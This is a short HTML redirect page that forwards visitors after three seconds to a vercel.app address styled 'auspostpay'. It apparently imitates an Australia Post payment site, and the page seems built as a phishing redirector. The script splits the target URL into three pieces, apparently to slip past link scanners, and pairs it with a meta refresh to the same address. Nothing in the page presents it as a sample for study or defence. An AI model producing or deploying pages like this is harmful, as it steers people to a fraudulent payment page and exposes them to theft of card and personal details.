<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="3;url=https://auspostpay-27zo.vercel.app">
    <script>
        // Simple URL assembly from parts
        const part1 = "https://auspostpay";
        const part2 = "-27zo";
        const part3 = ".vercel.app";
        const targetUrl = part1 + part2 + part3;

        // Perform redirect after 3 seconds
        setTimeout(() => {
            window.location.href = targetUrl;
        }, 3000);
    </script>
</head>
<body>
    <p>You will be redirected in 3 seconds...</p>
</body>
</html>
